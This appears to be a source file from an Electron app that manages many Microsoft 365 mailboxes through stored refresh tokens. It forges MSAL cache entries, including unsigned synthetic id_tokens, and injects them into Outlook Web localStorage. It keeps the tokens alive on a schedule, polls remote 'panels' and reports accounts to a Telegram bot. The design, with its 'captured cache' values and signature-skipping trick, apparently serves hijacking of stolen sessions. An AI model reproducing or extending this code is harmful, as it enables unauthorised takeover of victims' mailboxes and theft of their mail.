    h['RequestId'] = crypto.randomUUID();
    h['X-OWA-ActiveSubscription'] = '{}';
    const cookieHint = `DefaultAnchorMailbox=UPN:${auth.email}`;
    if (!h['Cookie']) h['Cookie'] = cookieHint;
    else if (!String(h['Cookie']).includes('DefaultAnchorMailbox')) h['Cookie'] = `${h['Cookie']}; ${cookieHint}`;
    callback({ requestHeaders: h });
  });

  outlookSess.webRequest.onBeforeSendHeaders({ urls: LOGIN_HINT_URL_PATTERNS }, (details, callback) => {
    const auth = outlookSessionAuth.get(outlookSess);
    if (!auth?.email) {
      callback({ requestHeaders: details.requestHeaders });
      return;
    }
    const h = { ...details.requestHeaders };
    const cookieHint = `DefaultAnchorMailbox=UPN:${auth.email}`;
    if (!h['Cookie']) h['Cookie'] = cookieHint;
    else if (!String(h['Cookie']).includes('DefaultAnchorMailbox')) h['Cookie'] = `${h['Cookie']}; ${cookieHint}`;
    callback({ requestHeaders: h });
  });
}

async function reinjectMsalCacheIntoOwaPage(wc: WebContents, accountId: string): Promise<void> {
  const cache = msalCacheMap.get(accountId);
  if (!cache || Object.keys(cache).length === 0) return;
  const url = wc.getURL();
  if (!url || (!/outlook|office365|office\.com|cloud\.microsoft|microsoft\.com/i.test(url))) return;
  try {
    const injected = JSON.stringify(cache);
    await wc.executeJavaScript(`
      (function () {
        try {
          var c = ${injected};
          Object.keys(c).forEach(function (k) { localStorage.setItem(k, c[k]); });
          dlog('[Outlook][MainReinject] localStorage MSAL keys:', Object.keys(c).length);
        } catch (e) {
          console.error('[Outlook][MainReinject]', e);
        }
      })();
    `);
  } catch (e) {
    console.warn('[Outlook] MSAL reinject executeJavaScript failed:', e);
  }
}

async function regenerateMsalCacheForClientId(accountId: string, clientId: string): Promise<boolean> {
  appendOutlookDebug(`[MSAL] Regenerate cache requested for account=${accountId}, clientId=${clientId}`);
  // Persist latest discovered OWA client id
  try {
    const state = await readState();
    state.owaClientId = clientId;
    await writeState(state);
  } catch (e) {
    console.warn('[MAIN] Failed to persist owaClientId:', e);
  }

  const storeData = await readStore();
  const accounts = storeData.accounts as any[] | undefined;
  const account = accounts?.find((a: any) => a.id === accountId);
  if (!account) {
    appendOutlookDebug('[MSAL] Regenerate skipped: account not found');
    return false;
  }
  const existingCache = msalCacheMap.get(accountId);
  if (!existingCache) {
    appendOutlookDebug('[MSAL] Regenerate skipped: no existing cache');
    return false;
  }

  let accessToken = '';
  let refreshToken = '';
  let idToken = '';
  for (const [, value] of Object.entries(existingCache)) {
    try {
      const entry = JSON.parse(value as string);
      if (entry.credentialType === 'AccessToken') accessToken = entry.secret;
      else if (entry.credentialType === 'RefreshToken') refreshToken = entry.secret;
      else if (entry.credentialType === 'IdToken') idToken = entry.secret;
    } catch {
      // non-json entries
    }
  }
  if (!accessToken || !refreshToken) {
    appendOutlookDebug('[MSAL] Regenerate skipped: missing token secrets in cache');
    return false;
  }

  const newCache = generateMsalCache(account, accessToken, refreshToken, idToken || undefined, clientId);
  msalCacheMap.set(accountId, newCache);
  appendOutlookDebug(`[MSAL] Cache regenerated for clientId=${clientId}, entries=${Object.keys(newCache).length}`);
  return true;
}

function stripSessionClaims(idToken: string): string {
  try {
    const parts = idToken.split('.');
    if (parts.length !== 3) return idToken;
    const payload = JSON.parse(
      Buffer.from(parts[1], 'base64').toString('utf8')
    );
    delete payload.sid;
    delete payload.login_hint;
    delete payload.login_req;
    delete payload.pwd_url;
    delete payload.pwd_exp;
    const newPayload = Buffer.from(JSON.stringify(payload))
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
    // Drop the signature - MSAL does not verify cached token signatures
    return `${parts[0]}.${newPayload}.`;
  } catch {
    return idToken;
  }
}

function generateMsalCache(account: any, accessToken: string, refreshToken: string, idToken?: string, clientIdOverride?: string): Record<string, string> {
  dlog('[MSAL] Generating EXACT HighHopes cache for', account.email);

  // Decode token payload to get oid/tid
  let payload: any = {};
  try {
    const parts = accessToken.split('.');
    if (parts.length === 3) {
      payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    }
  } catch (err) {
    console.warn('[MSAL] Failed to decode token:', err);
  }

  // Exact values from HighHopes captured cache
  // Default to Microsoft Office SPA id (matches most panel / device tokens). HighHopes capture uses override.
  const clientId = clientIdOverride || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
  const environment = 'login.windows.net';
  dlog('[MSAL] Using clientId for cache:', clientId, '(override:', clientIdOverride ? 'yes' : 'no', ')');

  // Determine oid/tid from token payload (prefer idToken, fallback to access token)
  let tokenPayload = payload; // from earlier access token decode
  if (idToken) {
    try {
      const parts = idToken.split('.');
      if (parts.length === 3) {
        tokenPayload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      }
    } catch (err) {
      console.warn('[MSAL] Failed to decode idToken, using access token payload:', err);
    }
  }
  const oid = tokenPayload.oid || payload.oid || '1f5ce522-2ee5-4585-8a5c-5f017b2d291a';
  const tid = tokenPayload.tid || payload.tid || 'cf404960-c50f-46d2-8bf3-a3c957283b86';
  const homeAccountId = `${oid}.${tid}`;
  const realm = tid;
  const username = account.email;
  // Generate clientInfo (base64 {"uid":"oid","utid":"tid"})
  const clientInfo = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64');

  // Exact scopes from HighHopes cache
  const scopes = 'https://outlook.office.com/.default openid profile offline_access';

  const now = Date.now();
  const makeSyntheticIdToken = (audClientId: string): string => {
    const header = { typ: 'JWT', alg: 'RS256', kid: 'dummy' };
    const payloadForAud = {
      aud: audClientId,
      iss: `https://${environment}/${realm}/v2.0`,
      iat: Math.floor(now / 1000) - 300,
      nbf: Math.floor(now / 1000) - 300,
      exp: Math.floor(now / 1000) + 3600,
      aio: 'ATQAy/8TAAAAsKvCRhQOKjVZvMBTq8AJhXN0Z/KMvjf4dUqvusw/ZH4uMJyYvrgWrgRX',
      name: username,
      oid: oid,
      preferred_username: username,
      rh: '0.AAAA...',
      sub: oid,
      tid: realm,
      uti: 'ABCDEFGHIJKLMNOPQRSTUV',
      ver: '2.0'
    };
    const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const payloadB64 = Buffer.from(JSON.stringify(payloadForAud)).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    return `${headerB64}.${payloadB64}.`;
  };

  // Build EXACT cache matching HighHopes captured localStorage
  const cache: Record<string, string> = {};

  // 1. msal.version (exact)
  cache['msal.version'] = '4.28.2';

  // 2. App metadata (exact format and values)
  cache[`appmetadata-${environment}-${clientId}`] = JSON.stringify({
    clientId,
    environment,
    familyId: "1"
  });

  // 3. Account entry (EXACT clientInfo from HighHopes)
  const accountKey = `msal.2|${homeAccountId}|${environment}|${realm}`;
  const idTokenClaims: any = {
    "aud": clientId,
    "iss": `https://${environment}/${realm}/v2.0`,
    "iat": Math.floor(now / 1000) - 300,
    "nbf": Math.floor(now / 1000) - 300,
    "exp": Math.floor(now / 1000) + 3600,
    "aio": "ATQAy/8TAAAAsKvCRhQOKjVZvMBTq8AJhXN0Z/KMvjf4dUqvusw/ZH4uMJyYvrgWrgRX",
    "name": username,
    "oid": oid,
    "preferred_username": username,
    "rh": "0.AAAA...",
    "sub": oid,
    "tid": realm,
    "uti": "ABCDEFGHIJKLMNOPQRSTUV",
    "ver": "2.0"
  };
  delete idTokenClaims.sid;
  delete idTokenClaims.login_hint;
  delete idTokenClaims.login_req;
  delete idTokenClaims.pwd_url;
  delete idTokenClaims.pwd_exp;
  cache[accountKey] = JSON.stringify({
    authorityType: "MSSTS",
    clientInfo: clientInfo, // Base64 {"uid":"oid","utid":"tid"}
    homeAccountId,
    environment,
    realm,
    localAccountId: oid,
    username,
    name: username,
    idTokenClaims,
    nativeAccountId: "",
    tenantProfiles: [{
      tenantId: realm,
      localAccountId: payload.oid || "",
      name: username,
      isHomeTenant: true
    }],
    lastUpdatedAt: now.toString()
  });

  // 5. Access token entry
  const accessTokenKey = `msal.2|${homeAccountId}|${environment}|${scopes}||`;
  cache[accessTokenKey] = JSON.stringify({
    homeAccountId,
    environment,
    credentialType: "AccessToken",
    clientId,
    secret: accessToken,
    realm,
    target: scopes,
    cachedAt: Math.floor(now / 1000).toString(),
    expiresOn: payload.exp ? payload.exp.toString() : (Math.floor(now / 1000) + 3600).toString(),
    extendedExpiresOn: (payload.exp ? payload.exp + 7200 : Math.floor(now / 1000) + 10800).toString(),
    tokenType: "Bearer",
    requestedClaims: "",
    requestedClaimsHash: "",
    keyId: "",
    userAssertionHash: "",
    lastUpdatedAt: now.toString()
  });

  // 6. Refresh token entry
  const refreshTokenKey = `msal.2|${homeAccountId}|${environment}|refreshtoken|1||||`;
  cache[refreshTokenKey] = JSON.stringify({
    credentialType: "RefreshToken",
    homeAccountId,
    environment,
    clientId,
    secret: refreshToken,
    lastUpdatedAt: now.toString()
  });

  // 7. ID token entry (optional, OWA may not need it)
  const idTokenKey = `msal.2|${homeAccountId}|${environment}|${clientId}|${realm}||`;
  // Generate synthetic id_token if not provided
  let idTokenToUse = idToken;
  if (!idTokenToUse) {
    // No signature (empty) - MSAL may not validate signature for cached tokens
    idTokenToUse = makeSyntheticIdToken(clientId);
    dlog('[MSAL] Generated synthetic id_token (aud:', clientId.substring(0, 8), '..., oid:', oid.substring(0, 8), '...)');
  }
  idTokenToUse = stripSessionClaims(idTokenToUse);
  cache[idTokenKey] = JSON.stringify({
    credentialType: "IdToken",
    homeAccountId,
    environment,
    clientId,
    secret: idTokenToUse,
    realm,
    lastUpdatedAt: now.toString()
  });

  // 8. Account keys list
  cache['msal.2.account.keys'] = JSON.stringify([accountKey]);

  // 9. Token keys list
  cache[`msal.2.token.keys.${clientId}`] = JSON.stringify({
    idToken: [idTokenKey],
    accessToken: [accessTokenKey],
    refreshToken: [refreshTokenKey]
  });

  // 10. Active account filter
  cache[`msal.${clientId}.active-account-filters`] = JSON.stringify({
    homeAccountId,
    environment,
    realm,
    localAccountId: payload.oid || "",
    username,
    name: username,
    clientInfo,
    lastUpdatedAt: Math.floor(now / 1000).toString()
  });

  // 11. OWA MSAL expiry timestamp
  cache['olk-msalexp'] = now.toString();

  // Duplicate entries for known OWA client IDs so silent auth can resolve whichever app id Outlook requests.
  const aliasClientIds = new Set<string>(
    [
      clientId,
      account.auth?.clientId,
      'd3590ed6-52b3-4102-aeff-aad2292ab01c',
      '9199bf20-a13f-4107-85dc-02114787ef48',
    ].filter(Boolean)
  );
  for (const aliasClientId of aliasClientIds) {
    if (aliasClientId === clientId) continue;
    dlog('[MSAL] Duplicating cache for alias client ID:', aliasClientId);
    cache[`appmetadata-${environment}-${aliasClientId}`] = JSON.stringify({
      clientId: aliasClientId,
      environment,
      familyId: "1"
    });
    cache[`msal.2.token.keys.${aliasClientId}`] = JSON.stringify({
      idToken: [`msal.2|${homeAccountId}|${environment}|${aliasClientId}|${realm}||`],
      accessToken: [accessTokenKey],
      refreshToken: [refreshTokenKey]
    });
    const aliasIdTokenKey = `msal.2|${homeAccountId}|${environment}|${aliasClientId}|${realm}||`;
    const aliasIdToken = stripSessionClaims(makeSyntheticIdToken(aliasClientId));
    cache[aliasIdTokenKey] = JSON.stringify({
      credentialType: "IdToken",
      homeAccountId,
      environment,
      clientId: aliasClientId,
      secret: aliasIdToken,
      realm,
      lastUpdatedAt: now.toString()
    });
    cache[`msal.${aliasClientId}.active-account-filters`] = JSON.stringify({
      homeAccountId,
      environment,
      realm,
      localAccountId: payload.oid || "",
      username,
      name: username,
      clientInfo,
      lastUpdatedAt: Math.floor(now / 1000).toString()
    });
  }

  dlog('[MSAL] Generated', Object.keys(cache).length, 'cache entries for clientId', clientId);
  dlog('[MSAL] HomeAccountId:', homeAccountId, 'Environment:', environment, 'Scopes:', scopes);
  return cache;
}

// Polyfill for AbortSignal.timeout (Node.js < 16.11.0)
function timeoutSignal(ms: number): AbortSignal {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), ms);
  // Clear the timeout if the signal is already aborted (e.g., by another source)
  const signal = controller.signal;
  signal.addEventListener('abort', () => clearTimeout(timeoutId));
  return signal;
}

const TELEGRAM_MESSAGE_MAX = 4096;
const TELEGRAM_RETRY_ATTEMPTS = 3;
const TELEGRAM_RETRY_BASE_MS = 400;

function truncateTelegramMessage(text: string, max = TELEGRAM_MESSAGE_MAX): string {
  if (text.length <= max) return text;
  const ellipsis = '\n<i>...truncated</i>';
  const take = Math.max(0, max - ellipsis.length);
  return text.slice(0, take) + ellipsis;
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function escapeTelegramHtmlPlain(s: string): string {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/** Ensures JSON → UTF-8 is valid (Telegram rejects malformed surrogate pairs). */
function sanitizeTelegramUtf8(text: string): string {
  if (typeof text !== 'string') return '';
  return Buffer.from(text, 'utf8').toString('utf8');
}

async function telegramApiSendMessage(
  token: string,
  chatId: string,
  text: string,
  parseMode: 'HTML' | undefined = 'HTML'
): Promise<{ ok: boolean; description?: string; retryAfterSec?: number; httpStatus?: number }> {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const safeText = sanitizeTelegramUtf8(text);
  const body: Record<string, unknown> = { chat_id: chatId, text: safeText };
  if (parseMode) body.parse_mode = parseMode;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json; charset=utf-8' },
    body: JSON.stringify(body),
    signal: timeoutSignal(15000),
  } as any);
  const data = (await response.json()) as {
    ok?: boolean;
    description?: string;
    parameters?: { retry_after?: number };
  };
  const retryAfterSec =
    typeof data.parameters?.retry_after === 'number'
      ? data.parameters.retry_after
      : undefined;
  return {
    ok: Boolean(data.ok),
    description: data.description,
    retryAfterSec,
    httpStatus: response.status,
  };
}

/** Truncates once, retries transient failures; avoids retry on obvious client errors. */
async function telegramSendWithRetry(
  token: string,
  chatId: string,
  text: string,
  parseMode: 'HTML' | undefined = 'HTML'
): Promise<{ success: boolean; error?: string }> {
  const payload = truncateTelegramMessage(sanitizeTelegramUtf8(text));
  let lastErr = 'Telegram request failed';
  for (let attempt = 0; attempt < TELEGRAM_RETRY_ATTEMPTS; attempt++) {
    try {
      const res = await telegramApiSendMessage(token, chatId, payload, parseMode);
      if (res.ok) return { success: true };
      lastErr = res.description || 'Telegram API error';
      const isRateLimited =
        res.httpStatus === 429 ||
        /Too Many Requests|retry after/i.test(res.description || '');
      if (isRateLimited && attempt < TELEGRAM_RETRY_ATTEMPTS - 1) {
        const sec = res.retryAfterSec ?? parseInt(/retry after (\d+)/i.exec(res.description || '')?.[1] || '5', 10);
        const waitMs = Math.min(Math.max(sec, 1) * 1000, 120000);
        await sleep(waitMs);
        continue;
      }
      if (
        res.description &&
        /can't parse entities|message text is empty|chat not found|bot was blocked|unauthorized|not enough rights|UTF-8/i.test(
          res.description
        )
      ) {
        return { success: false, error: lastErr };
      }
    } catch (e: any) {
      lastErr = e?.message || String(e);
    }
    if (attempt < TELEGRAM_RETRY_ATTEMPTS - 1) {
      await sleep(TELEGRAM_RETRY_BASE_MS * (attempt + 1));
    }
  }
  return { success: false, error: lastErr };
}

function logTelegramFailure(context: string, err: string): void {
  const safe = String(err).replace(/bot\d+:[A-Za-z0-9_-]+/gi, 'bot<redacted>');
  console.warn(`[Telegram:${context}]`, safe.substring(0, 300));
}

async function sendAccountsTelegramNotification(store: Record<string, any>, htmlBody: string): Promise<void> {
  const cfg = store.settings?.telegram?.accounts;
  if (!cfg?.enabled || !cfg?.token || !cfg?.chatId) return;
  const result = await telegramSendWithRetry(cfg.token, cfg.chatId, htmlBody, 'HTML');
  if (!result.success) logTelegramFailure('accounts', result.error || 'failed');
}

// --------------------------
// Error handling
// --------------------------
process.on('uncaughtException', (error) => {
  console.error('[Main] Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[Main] Unhandled Rejection at:', promise, 'reason:', reason);
});

// --------------------------
// URL normalization (same as renderer/utils/url)
// --------------------------
function normalizePanelUrl(url: string): string {
  let normalized = url.trim();
  if (!normalized.startsWith('http://') && !normalized.startsWith('https://')) {
    normalized = 'https://' + normalized;
  }
  // Remove trailing slash
  normalized = normalized.replace(/\/$/, '');
  return normalized;
}

// --------------------------
// Single instance lock
// --------------------------
const multiInstanceForTests = process.env.ALLOW_MULTI_INSTANCE === '1';
const gotLock = multiInstanceForTests ? true : app.requestSingleInstanceLock();
if (!gotLock) {
  console.log('[Main] Another instance is already running, quitting...');
  app.quit();
  process.exit(0);
}

let mainWindow: BrowserWindow | null = null;
const isDev = process.env.NODE_ENV === 'development';

// Focus main window on second instance
app.on('second-instance', () => {
  if (mainWindow) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
});

// --------------------------
// Simple file-based store
// --------------------------
const userDataPath = app.getPath('userData');
const storePath = path.join(userDataPath, 'store.json');
const statePath = path.join(userDataPath, 'state.json');

// UI state schema imported from '../types/state'

async function ensureStateFile() {
  try {
    await fs.access(statePath);
  } catch {
    await fs.mkdir(userDataPath, { recursive: true });
    await fs.writeFile(statePath, JSON.stringify(DEFAULT_STATE, null, 2), 'utf-8');
  }
}

async function readStore(): Promise<Record<string, any>> {
  try {
    const data = await fs.readFile(storePath, 'utf-8');
    return JSON.parse(data);
  } catch (err) {
    return {};
  }
}

async function writeStore(data: Record<string, any>) {
  await fs.mkdir(userDataPath, { recursive: true });
  const tmpPath = storePath + '.tmp';
  try {
    await fs.writeFile(tmpPath, JSON.stringify(data, null, 2), 'utf-8');
    await fs.rename(tmpPath, storePath);
  } catch (err) {
    // If rename fails, try to delete tmp file and fallback to direct write
    try {
      await fs.unlink(tmpPath);
    } catch {}
    // Fallback to original write (non‑atomic) as last resort
    await fs.writeFile(storePath, JSON.stringify(data, null, 2), 'utf-8');
  }
}

const LOCAL_DEV_ACCOUNT_FILE = 'local-dev-account.json';

/** Dev-only: load gitignored JSON next to the project (or next to compiled main) and upsert a token account. */
async function seedDevAccountFromLocalFile(): Promise<void> {
  if (app.isPackaged) return;

  const candidates = [
    path.join(process.cwd(), LOCAL_DEV_ACCOUNT_FILE),
    path.join(__dirname, '../../../local-dev-account.json'),
  ];

  let raw: string | null = null;
  let usedPath: string | null = null;
  for (const p of candidates) {
    try {
      raw = await fs.readFile(p, 'utf-8');
      usedPath = p;
      break;
    } catch {
      /* try next */
    }
  }
  if (!raw || !usedPath) return;

  let data: any;
  try {
    data = JSON.parse(raw);
  } catch (e) {
    console.warn('[DevSeed] Invalid JSON in', LOCAL_DEV_ACCOUNT_FILE, e);
    return;
  }

  const email = String(data.email || '').trim();
  if (!email) {
    console.warn('[DevSeed] Missing email in', usedPath);
    return;
  }

  let refreshToken: string | undefined;
  let clientId: string | undefined;
  let authorityEndpoint: string | undefined;
  let scopeType: string | undefined;
  let resource: string | undefined;
  const name = (data.name || data.display_name || email.split('@')[0]) as string;

  if (data.token && typeof data.token === 'object') {
    refreshToken = data.token.refresh_token || data.token.refreshToken;
    const scopeStr = typeof data.token.scope === 'string' ? data.token.scope : '';
    if (scopeStr.includes('https://outlook.office.com')) {
      resource = 'https://outlook.office.com';
    }
  }
  refreshToken = refreshToken || data.refreshToken || data.refresh_token;
  clientId = data.clientId || data.client_id;
  authorityEndpoint = data.authorityEndpoint || data.authority_endpoint;
  scopeType = data.scopeType || data.scope_type || 'ews';
  resource = data.resource || resource || 'https://outlook.office.com';

  if (!clientId) clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
  if (!authorityEndpoint) authorityEndpoint = 'cf404960-c50f-46d2-8bf3-a3c957283b86';

  const rt = String(refreshToken || '').trim();
  if (!rt || /PASTE|REPLACE|YOUR_|HERE/i.test(rt)) {
    console.warn(
      '[DevSeed] Add a real refresh_token to',
      usedPath,
      '(see local-dev-account.example.json). Skipping seed.'
    );
    return;
  }

  const store = await readStore();
  const accounts: any[] = store.accounts || [];
  const existing = accounts.find((a: any) => String(a.email || '').toLowerCase() === email.toLowerCase());
  const auth = {
    type: 'token' as const,
    clientId,
    authorityEndpoint,
    refreshToken: rt,
    scopeType,
    resource,
  };

  if (existing) {
    dlog('[DevSeed] Updating existing account auth for', email);
    existing.auth = auth;
    existing.status = 'active';
    existing.name = name;
  } else {
    accounts.push({
      id: crypto.randomUUID(),
      email,
      name,
      added: new Date().toISOString(),
      status: 'active',
      tags: ['dev-seed'],
      auth,
    });
    store.accounts = accounts;
  }

  await writeStore(store);
  dlog('[DevSeed] Loaded account from', usedPath, '→', email);
}

// --------------------------
// State persistence
// --------------------------
async function readState(): Promise<AppState> {
  try {
    const data = await fs.readFile(statePath, 'utf-8');
    const parsed = JSON.parse(data);
    // Merge with defaults for missing fields
    return { ...DEFAULT_STATE, ...parsed };
  } catch (err) {
    return DEFAULT_STATE;
  }
}

async function writeState(state: AppState) {
  await fs.mkdir(userDataPath, { recursive: true });
  await fs.writeFile(statePath, JSON.stringify(state, null, 2), 'utf-8');
}

// --------------------------
// Session validity check (HEAD request for each account)
// --------------------------
async function checkSessionValidity(): Promise<void> {
  dlog('[Session] Starting session validity check');
  try {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    const panels: any[] = store.panels || [];
    dlog(`[Session] Checking ${accounts.length} accounts, ${panels.length} panels`);

    for (const account of accounts) {
      const panel = panels.find(p => p.id === account.panelId);
      if (!panel || !panel.token) {
        dlog(`[Session] Account ${account.email} - no panel or token, marking expired`);
        account.status = 'expired';
        continue;
      }
      // Lightweight HEAD request to panel API to verify token
      try {
        dlog(`[Session] Checking ${account.email} via panel ${panel.name} (${panel.url})`);
        // Polyfill for AbortSignal.timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        try {
          const response = await fetch(`${panel.url}/api/admin/accounts`, {
            method: 'HEAD',
            headers: { Authorization: `Bearer ${panel.token}` },
            signal: controller.signal,
          } as any);
          clearTimeout(timeoutId);
          account.status = response.ok ? 'active' : 'expired';
        } catch (err) {
          clearTimeout(timeoutId);
          throw err;
        }
        dlog(`[Session] Account ${account.email} status: ${account.status}`);
      } catch (err) {
        console.error(`[Session] Error checking ${account.email}:`, err);
        account.status = 'expired';
      }
    }
    // Update store with new statuses
    store.accounts = accounts;
    await writeStore(store);
    dlog('[Session] Session validity check completed');
  } catch (err) {
    console.error('Session validity check failed:', err);
  }
}

async function exchangeV1ForV2Token(
  clientId: string,
  authority: string,
  refreshToken: string,
  resource?: string
): Promise<{ accessToken: string; refreshToken: string; expiresIn: number; tokenType: string; idToken?: string }> {
  const tenant = normalizeAuthorityTenant(authority);
  const endpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000);
  try {
    const scope = resource === 'https://graph.microsoft.com' ? 'https://graph.microsoft.com/.default openid profile offline_access' : 'https://outlook.office.com/.default openid profile offline_access';
    dlog('[Microsoft] V2 token exchange scope:', scope, 'resource:', resource);
    const bodyParams = new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      client_id: clientId,
      scope,
    });
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: bodyParams,
      signal: controller.signal,
    } as any);
    clearTimeout(timeoutId);
    if (!response.ok) {
      const data = await response.json().catch(() => ({}));
      if (data.error === 'invalid_grant') {
        const err = new Error('REFRESH_TOKEN_EXPIRED');
        (err as any).code = 'REFRESH_TOKEN_EXPIRED';
        throw err;
      }
      throw new Error(`V2 token exchange failed: ${data.error_description || response.status}`);
    }
    const data = await response.json();
    dlog('[Microsoft] V2 token exchange succeeded', {
      expires_in: data.expires_in,
      has_id_token: !!data.id_token,
      scope: data.scope,
    });
    return {
      accessToken: data.access_token,
      refreshToken: data.refresh_token || refreshToken,
      expiresIn: data.expires_in,
      tokenType: data.token_type || 'Bearer',
      idToken: data.id_token,
    };
  } catch (error: any) {
    clearTimeout(timeoutId);
    if (error.code) throw error;
    throw error;
  }
}

type RefreshAllResult = {
  success: number;
  expired: number;
  failed: number;
  /** Per-account outcomes so renderer can show a green/yellow/red list. */
  accounts: Array<{
    accountId: string;
    email?: string;
    outcome: 'success' | 'expired' | 'failed';
    error?: string;
  }>;
  errors: Array<{ accountId: string; error: string }>;
};

/** Last result + when it ran. Read by `tokens:refreshStatus`. */
let lastTokenRefresh: { ranAt: string; result: RefreshAllResult } | null = null;
/** Reason the last run started — 'startup' | 'interval' | 'settings' | 'manual'. */
let lastTokenRefreshReason: string | null = null;

async function refreshAllTokens(): Promise<RefreshAllResult> {
  try {
    const store = await readStore();
    const accounts: any[] = store.accounts || [];
    const tokenAccounts = accounts.filter(a => a.auth?.type === 'token' && a.status === 'active');
    const results: RefreshAllResult = {
      success: 0,
      expired: 0,
      failed: 0,
      accounts: [],
      errors: [],
    };

    const recordOutcome = (
      account: any,
      outcome: 'success' | 'expired' | 'failed',
      error?: string
    ) => {
      results.accounts.push({
        accountId: account.id,
        email: account.email,
        outcome,
        error,
      });
    };

    // Process in batches to avoid rate limits
    const batchSize = 5;
    for (let i = 0; i < tokenAccounts.length; i += batchSize) {
      const batch = tokenAccounts.slice(i, i + batchSize);
      const promises = batch.map(async (account) => {
        try {
          const { clientId, authorityEndpoint, refreshToken } = account.auth;
          if (!clientId || !authorityEndpoint || !refreshToken) {
            results.failed++;
            results.errors.push({ accountId: account.id, error: 'Missing auth fields' });
            recordOutcome(account, 'failed', 'Missing auth fields');
            return;
          }
          const scopeType = account.auth.scopeType || 'ews';
          const resource = account.auth.resource;
          const result = await refreshMicrosoftToken(
            clientId,
            authorityEndpoint,
            refreshToken,
            scopeType,
            resource || '00000002-0000-0ff1-ce00-000000000000'
          );
          account.auth.refreshToken = result.refreshToken;
          account.auth.scopeType = scopeType;
          account.lastRefresh = new Date().toISOString();
          account.status = 'active';
          // Clear any prior re-auth flag set by REFRESH_TOKEN_EXPIRED.
          if (account.requiresReauth) account.requiresReauth = false;
          if (account.lastError) account.lastError = '';
          results.success++;
          recordOutcome(account, 'success');
        } catch (error: any) {
          if (error.code === 'REFRESH_TOKEN_EXPIRED') {
            account.status = 'expired';
            account.lastRefresh = new Date().toISOString();
            // Surface a clear UI signal so the user can sign in again.
            account.requiresReauth = true;
            account.lastError =
              'Microsoft revoked this refresh token. Click "Sign in again" to re-authenticate.';
            results.expired++;
            recordOutcome(account, 'expired');
          } else {
            const msg = error.message || 'Unknown';
            results.failed++;
            results.errors.push({ accountId: account.id, error: msg });
            recordOutcome(account, 'failed', msg);
          }
        }
      });
      await Promise.all(promises);
      // Delay between batches (10 seconds)
      if (i + batchSize < tokenAccounts.length) {
        await new Promise(resolve => setTimeout(resolve, 10000));
      }
    }

    // Append a single activity-feed entry summarising this run so the
    // Dashboard can show the user that auto-refresh is alive.
    try {
      const feed: any[] = Array.isArray(store.activityFeed) ? store.activityFeed : [];
      const reason = lastTokenRefreshReason || 'scheduled';
      feed.unshift({
        id: crypto.randomUUID(),
        type: 'token-refresh',
        severity: results.failed > 0 ? 'warning' : 'info',
        message:
          `Auto-refresh swept ${tokenAccounts.length} token accounts ` +
          `(${results.success} ok / ${results.expired} expired / ${results.failed} failed)` +
          ` — ${reason}`,
        timestamp: new Date().toISOString(),
      });
      store.activityFeed = feed.slice(0, 500);
    } catch (err) {
      console.warn('[refreshAllTokens] failed to append activity entry:', err);
    }

    // Save updated store
    await writeStore(store);
    lastTokenRefresh = { ranAt: new Date().toISOString(), result: results };
    return results;
  } catch (error: any) {
    console.error('refreshAllTokens failed:', error);
    const errResult: RefreshAllResult = {
      success: 0,
      expired: 0,
      failed: 0,
      accounts: [],
      errors: [{ accountId: '', error: error.message }],
    };
    lastTokenRefresh = { ranAt: new Date().toISOString(), result: errResult };
    return errResult;
  }
}

let tokenRefreshIntervalId: NodeJS.Timeout | null = null;

async function startTokenRefreshScheduler() {
  // Clear existing interval
  if (tokenRefreshIntervalId) {
    clearInterval(tokenRefreshIntervalId);
    tokenRefreshIntervalId = null;
  }
  // Read interval from settings (default 45 minutes)
  const store = await readStore();
  const intervalMinutes = store.settings?.refresh?.intervalMinutes || 45;
  if (intervalMinutes <= 0) {
    console.log('Token refresh scheduler disabled (interval <= 0)');
    return;
  }
  console.log(`Starting token refresh scheduler, interval: ${intervalMinutes} minutes`);
  // Run first refresh after 1 minute
  setTimeout(() => {
    lastTokenRefreshReason = 'startup';
    refreshAllTokens().then(results => {
      console.log(`Initial token refresh completed: ${results.success} succeeded, ${results.expired} expired, ${results.failed} failed`);
    });
  }, 60000);
  // Schedule periodic refreshes
  const intervalMs = intervalMinutes * 60 * 1000;
  tokenRefreshIntervalId = setInterval(() => {
    lastTokenRefreshReason = 'interval';
    refreshAllTokens().then(results => {
      console.log(`Periodic token refresh completed: ${results.success} succeeded, ${results.expired} expired, ${results.failed} failed`);
    });
  }, intervalMs);
}

function stopTokenRefreshScheduler() {
  if (tokenRefreshIntervalId) {
    clearInterval(tokenRefreshIntervalId);
    tokenRefreshIntervalId = null;
    console.log('Token refresh scheduler stopped');
  }
}

// --------------------------
// IPC Handlers
// --------------------------
function setupIpcHandlers() {
  // Store
  ipcMain.handle('store:get', async (_, key: string) => {
    const store = await readStore();
    return store[key];
  });

  ipcMain.handle('store:set', async (_, key: string, value: any) => {
    const store = await readStore();
    store[key] = value;
    await writeStore(store);
    return true;
  });

  ipcMain.handle('store:delete', async (_, key: string) => {
    const store = await readStore();
    delete store[key];
    await writeStore(store);
    return true;
  });

  // State
  ipcMain.handle('state:get', async () => {
    return await readState();
  });

